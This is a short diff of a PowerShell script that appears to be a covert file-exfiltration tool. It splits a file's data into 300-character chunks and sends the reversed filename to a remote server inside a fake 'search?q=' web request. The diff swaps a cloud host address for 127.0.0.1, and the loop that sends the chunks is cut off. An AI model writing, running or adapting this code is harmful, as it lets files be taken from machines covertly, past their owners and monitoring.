@@ -1,5 +1,5 @@
 $filename = $args[0] 
-$url = "http://myurl.sa-east-1.compute.amazonaws.com"
+$url = "127.0.0.1"
 
 if (!$filename) { $filename = Read-Host -Prompt 'Enter your filename (including extension if exists)' }
 
@@ -13,7 +13,7 @@ $finalData = $finalData -split '(\S{300})' | ? {$_}
 
 $emanelif = -join $filename[-1..-$filename.Length]
 
-Invoke-WebRequest -Uri $url/search?q=/$emanelif
+Invoke-WebRequest -Uri $url"/search?q=/"$emanelif
 
 foreach ($num in $finalData) {
 Get-Random -Count 1 -InputObject (97..122) | % -begin {$randomchar=$null} -process {$randomchar += [char]$_}  
